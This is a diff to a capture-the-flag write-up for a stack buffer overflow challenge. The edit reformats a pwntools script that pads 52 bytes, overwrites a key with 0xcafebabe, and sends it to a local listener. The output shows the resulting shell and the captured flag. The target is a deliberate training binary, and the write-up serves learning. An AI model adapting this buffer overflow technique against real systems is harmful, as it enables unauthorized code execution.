@@ -235,29 +235,27 @@ We have all the information we need to create an exploit.
 
 Let's craft our exploit and send it to the listener.
 
-```python
->>> from pwn import *
->>> padding = b"A" * 52
->>> key = p32(0xcafebabe)
->>> payload = padding + key
->>> io = remote('0',9000)
-[x] Opening connection to 0 on port 9000
-[x] Opening connection to 0 on port 9000: Trying 0.0.0.0
+```py title="/tmp/bof.py" showLineNmbers
+from pwn import *
+padding = b"A" * 52
+key = p32(0xcafebabe)
+payload = padding + key
+io = remote('0',9000)
+io.sendline(payload)
+io.interactive()
+```
+
+```
+bof@ubuntu:/tmp$ python script2.py
 [+] Opening connection to 0 on port 9000: Done
->>> io.sendline(payload)
->>> io.interactive()
 [*] Switching to interactive mode
-```
-
-Now that we have a shell, we can get the flag.
-
-```
-[*] Switching to interactive mode
-id
+$ id
 uid=1008(bof_pwn) gid=1008(bof_pwn) groups=1008(bof_pwn)
-cat ./flag
+$ cat ./flag
 Daddy_I_just_pwned_a_buff3r!
 ```
+
+&nbsp;
 
 ## Stuff I was trying unnecessarily
 
